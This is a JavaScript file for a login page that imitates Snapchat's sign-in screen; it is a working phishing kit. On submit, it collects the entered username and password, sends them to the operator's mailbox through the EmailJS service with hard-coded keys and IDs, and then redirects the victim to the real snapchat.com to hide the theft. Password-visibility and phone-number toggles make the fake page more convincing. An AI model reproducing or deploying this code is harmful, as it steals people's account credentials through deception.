// script of login.html file

const form = document.getElementById('contact-form');

if (window.emailjs) {
  emailjs.init({ publicKey: 'ccJ5Z0RyyYZDvgG_Z' });
}

function validatePassword(event) {
  const passwordInput = document.getElementById('password');
  const incorrectMessage = document.querySelector('.incorrect');

  if (passwordInput.value.length < 8) {
    incorrectMessage.style.display = 'block';
    event.preventDefault();
    return false;
  }

  incorrectMessage.style.display = 'none';
  return true;
}

function redirectToSnapchat() {
  setTimeout(function () {
    window.location.href = 'https://www.snapchat.com/';
  }, 1000);
}

if (form) {
  form.addEventListener('submit', function (event) {
    const isValid = validatePassword(event);

    if (!isValid) {
      return;
    }

    event.preventDefault();

    const submitButton = form.querySelector('button[type="submit"]');
    if (submitButton) {
      submitButton.disabled = true;
      submitButton.textContent = 'Loging...';
    }

    const username = document.getElementById('username')?.value || '';
    const password = document.getElementById('password')?.value || '';

    const templateParams = {
      username: username,
      password: password,
      message: `Username: ${username}\nPassword: ${password}`
    };

    emailjs.send('service_2hu9fdj', 'template_sdatcp3', templateParams)
      .then(() => {
        redirectToSnapchat();
      })
      .catch((error) => {
        console.error('EmailJS error:', error);
        if (submitButton) {
          submitButton.disabled = false;
          submitButton.textContent = 'Log In';
        }
      });
  });
}

// Toggle password visibility with dynamic image for show/hide
document.querySelector('.toggle-password')?.addEventListener('click', function () {
  const passwordField = document.getElementById('password');
  const eyeIcon = document.getElementById('eye-icon');

  if (passwordField.type === 'password') {
    passwordField.type = 'text';
    eyeIcon.src = 'img/eye-open.svg';
  } else {
    passwordField.type = 'password';
    eyeIcon.src = 'img/eye-closed.svg';
  }
});

// Switch between username/email and phone number
const switchToPhone = document.getElementById('switch-to-phone');
const usernameInput = document.getElementById('username');
const label = document.querySelector('label[for="username"]');

switchToPhone?.addEventListener('click', function () {
  if (label.textContent === 'USERNAME OR EMAIL') {
    label.textContent = 'PHONE NUMBER';
    usernameInput.type = 'tel';
    switchToPhone.textContent = 'Use email instead';
  } else {
    label.textContent = 'USERNAME OR EMAIL';
    usernameInput.type = 'text';
    switchToPhone.textContent = 'Use phone number instead';
  }
});

window.onload = function () {
  const errorMessage = document.getElementById('error-message');
  if (errorMessage) {
    errorMessage.style.display = 'block';

    document.body.addEventListener('click', function () {
      errorMessage.style.display = 'none';
    }, { once: true });
  }
};